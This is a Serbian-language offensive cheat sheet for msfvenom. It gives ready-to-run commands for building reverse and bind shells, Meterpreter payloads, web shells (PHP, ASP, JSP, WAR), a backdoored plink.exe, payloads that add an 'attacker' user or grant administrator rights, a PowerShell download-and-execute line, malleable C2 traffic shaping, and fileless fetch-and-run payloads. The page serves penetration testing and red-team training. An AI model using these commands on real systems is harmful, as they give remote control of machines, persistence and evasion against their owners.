# MSFVenom - CheatSheet

{{#include ../../banners/hacktricks-training.md}}

---

## Osnovni msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Koristite `-a` da izaberete arhitekturu payload-a, a `--platform` da izaberete ciljnu platformu.<sup>[[1]](#references)</sup>

## Izlistavanje
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Ove komande izlistavaju payload i encoder module dostupne u instaliranom framework-u.<sup>[[1]](#references)</sup>

## Uobičajeni parametri pri kreiranju shellcode-a
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
Ovde prikazane zastavice biraju nedozvoljene karaktere, izlazni format, encoder i broj iteracija encoding-a.<sup>[[1]](#references)</sup>

## Oblikovanje HTTP(S) Meterpreter saobraćaja

Metasploit 6.5 je dodao opciju `MALLEABLEC2` staged i stageless reverse HTTP(S) Meterpreter payload-ima. Profil može da izmeni URI-je, user agente, zaglavlja zahteva/odgovora, smeštanje connection-ID-ja i podržane kodiranja/wrapper-e tela. I generisani payload i njegov handler moraju učitati **isti lokalni profil**. Početni zahtev staged payload-a za Meterpreter stage nije oblikovan, zato koristite stageless payload, kao što je `windows/x64/meterpreter_reverse_https`, kada i prvi zahtev mora da odgovara profilu.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Konfigurišite matching handler sa identičnim payload-om i profilom:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Samo direktive dokumentovane kao implementirane utiču na saobraćaj; nepodržani blokovi profila mogu uspešno da se parsiraju, ali nemaju nikakav efekat.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Kreiranje korisnika
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Izvršavanje komande**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Kodiranje nije AV evasion:** encoder-i kao što je `x86/shikata_ga_nai` prvenstveno su korisni za ispunjavanje ograničenja loših znakova. Ponovljeno kodiranje nije pouzdana tehnika za AV evasion.<sup>[[1]](#references)</sup>

### Ugrađeno unutar izvršne datoteke
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Payload-i zasnovani na Web-u**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Payloads u skriptnim jezicima**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Fetch payloads generišu komandu koja omogućava dostupnom target utility-ju da preuzme i izvrši underlying native payload. Njihovi nazivi prate format `cmd/<platform>/<fetch-protocol>/<served-payload>`; dostupni su HTTP(S), SMB i TFTP adapteri, dok izbor downloader-a zavisi od target platforme.<sup>[[2]](#references)</sup>

Na primer, generišite Linux `wget` komandu koja preuzima x64 Meterpreter payload sa porta 8080 i povezuje ga nazad na port 4444:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Pokrenite **fetch handler** sa istim podešavanjima; on hostuje generisani ELF i takođe pokreće handler za posluženi Meterpreter payload:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Korisne zavisne opcije uključuju `FETCH_PIPE=true` za generisanje kraće HTTP(S) komande tamo gde je podržano i `FETCH_FILELESS=shell`, `shell-search` ili `python3.8+` za izvršavanje Linux ELF-a iz anonimnog deskriptora datoteke. Režimi bez datoteka zahtevaju Linux kernel 3.17 ili noviji; proverite tačan adapter pomoću `msfvenom -p <FETCH_PAYLOAD> --list-options`, jer se podržane kombinacije razlikuju.<sup>[[2]](#references)</sup>



## References

- [1] [Kako koristiti msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Kako koristiti Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
